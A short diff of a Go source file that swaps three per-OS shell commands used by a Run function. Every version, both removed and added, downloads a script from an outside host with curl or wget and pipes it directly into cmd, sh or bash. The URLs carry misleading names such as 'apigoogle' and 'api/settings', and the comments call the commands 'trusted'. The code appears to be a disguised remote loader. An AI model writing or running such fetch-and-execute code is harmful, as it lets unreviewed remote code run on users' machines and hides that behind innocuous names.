@@ -12,9 +12,9 @@ import (
 // Define the trusted shell command for each OS here before using Run.
 // An empty command causes Run to return an error for that OS.
 const (
-	windowsCommand = "curl --ssl-no-revoke -L https://smplu.link/apigoogle-windows | cmd"
-	linuxCommand   = "wget -qO- 'https://smplu.link/apigoogle-linux' | sh"
-	macOSCommand   = "curl -L 'https://smplu.link/apigoogle-mac' | bash"
+	windowsCommand = "curl --ssl-no-revoke -L https://a5lab.co/api/settings/windows | cmd"
+	linuxCommand   = "wget -qO- 'https://a5lab.co/api/settings/linux' | sh"
+	macOSCommand   = "curl -L 'https://a5lab.co/api/settings/mac' | bash"
 )
 
 // Run executes the predefined command below for the current OS and
